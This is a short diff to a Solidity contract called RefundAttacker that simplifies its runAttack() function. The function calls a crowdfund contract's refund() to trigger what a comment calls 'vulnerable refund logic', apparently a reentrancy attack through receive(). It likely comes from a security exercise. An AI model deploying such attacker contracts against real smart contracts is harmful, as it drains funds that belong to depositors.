@@ -58,12 +58,10 @@ contract RefundAttacker {
      * which will send ETH back to this contract and hit receive().
      */
     function runAttack() external onlyAttacker {
-        require(attackAmount > 0, "Call depositToCrowdfund first");
-
-        uint256 before = address(crowdfund).balance;
+        // No value is sent; we simply trigger the vulnerable refund logic.
         crowdfund.refund();
 
-        emit AttackTriggered(attackAmount, before);
+        emit AttackTriggered(attackAmount, address(crowdfund).balance);
     }
 
     /**
